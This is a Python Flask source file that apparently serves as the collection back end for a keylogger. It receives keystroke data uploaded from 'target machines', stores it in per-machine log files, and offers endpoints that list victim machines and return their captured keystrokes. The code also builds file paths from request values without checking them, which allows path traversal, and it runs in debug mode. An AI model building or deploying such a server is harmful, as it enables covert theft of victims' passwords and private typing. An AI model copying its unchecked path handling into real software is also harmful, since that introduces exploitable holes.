import os
from flask import Flask, jsonify, request, json
import time
from collections import OrderedDict


DATA_FOLDER = "data"

def generate_log_filename():
    return "log_" + time.strftime("%Y-%m-%d_%H-%M-%S") + ".txt"
app = Flask('app')
@app.route('/api/upload', methods=['POST'])
def upload():
    data = request.get_json()
    print(data)
    if not data or "machine" not in data or "data" not in data:
        return jsonify({"error": "Invalid payload"}), 400
    machine = data["machine"]
    log_data = data["data"]

    machine_folder = os.path.join(DATA_FOLDER, next(iter(machine)))
    if not os.path.exists(machine_folder):
        os.makedirs(machine_folder)

    filename = generate_log_filename()
    timestamp = filename[4:-4]
    file_path = os.path.join(machine_folder, filename)
    with open(file_path, "w", encoding="utf-8") as f:
        f.write(json.dumps({"timestamp": timestamp, "data": log_data}, indent=4, sort_keys=False) + "\n")
        return jsonify({"status": "success", "file": file_path, "data": log_data}), 200


@app.route('/api/get_target_machines_list', methods=['GET'])
def get_target_machines_list():
    machines = os.listdir(DATA_FOLDER)
    return jsonify({"machines": machines}), 200

@app.route('/api/get_keystrokes', methods=['GET'])
def get_target_machine_key_strokes():
    target_machine = request.args.get('target_machine')
    if not target_machine:
        return jsonify({"error": "Missing target_machine parameter"}), 400

    machine_folder = os.path.join(DATA_FOLDER, target_machine)
    if not os.path.exists(machine_folder):
        return jsonify({"error": "Machine not found"}), 404

    files = os.listdir(machine_folder)
    files.sort(reverse=True)
    print(files)
    data = []
    for file in files:
        with open(os.path.join(machine_folder, file), "r", encoding="utf-8") as f:
            file_data = json.load(f)
            data.append({
                "timestamp": file_data["timestamp"],
                "data": file_data["data"]
            })
    print(data)
    return jsonify({"data": data}), 200





if __name__ == '__main__':
 app.run(debug=True)

 # with open(file_path, "w", encoding="utf-8") as f:
 #     f.write(log_data)